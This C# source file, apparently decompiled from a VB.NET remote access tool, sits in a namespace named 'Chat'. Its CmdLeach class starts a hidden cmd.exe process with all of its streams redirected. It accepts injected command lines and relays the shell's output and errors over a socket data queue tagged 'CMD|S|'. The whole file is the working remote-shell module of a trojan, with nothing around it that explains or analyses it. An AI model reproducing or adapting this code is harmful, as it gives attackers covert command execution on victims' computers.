namespace Chat
{
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.Diagnostics;
    using System.Threading;

    [StandardModule]
    internal sealed class CmdLeach
    {
        public static Thread CmdTH1;
        public static Thread CMDTH2;
        public static Process Proc;

        public static void CmdStartFunc()
        {
            try
            {
                Proc = new Process();
                ProcessStartInfo startInfo = Proc.StartInfo;
                startInfo.FileName = "cmd";
                startInfo.Arguments = "";
                startInfo.UseShellExecute = false;
                startInfo.CreateNoWindow = true;
                startInfo.RedirectStandardOutput = true;
                startInfo.RedirectStandardError = true;
                startInfo.RedirectStandardInput = true;
                startInfo = null;
                Proc.Start();
                ThreadStart start = new ThreadStart(CmdLeach.SubCmd);
                CmdTH1 = new Thread(start);
                CmdTH1.Start();
                ThreadStart start2 = new ThreadStart(CmdLeach.SubCMD2);
                CMDTH2 = new Thread(start2);
                CMDTH2.Start();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static void InjectCMDLine(string Line)
        {
            Proc.StandardInput.WriteLine(Line);
            Proc.StandardInput.Flush();
        }

        private static void SubCmd()
        {
            while (true)
            {
                string str = Proc.StandardOutput.ReadLine();
                if (str != null)
                {
                    string str2 = str + "\r\n";
                    do
                    {
                        str = Proc.StandardOutput.ReadLine();
                        str2 = str2 + str + "\r\n";
                    }
                    while (str != null);
                    Socketss.ListDataSend.Add(new Data("CMD|S|" + str2, null, null));
                }
                Thread.Sleep(100);
            }
        }

        private static void SubCMD2()
        {
            string str = Proc.StandardError.ReadLine();
            try
            {
                while (str.Length >= 0)
                {
                    str = Proc.StandardError.ReadLine();
                    if (str.Length != 0)
                    {
                        Socketss.ListDataSend.Add(new Data("CMD|S|" + str, null, null));
                    }
                }
                Thread.Sleep(1);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }
    }
}

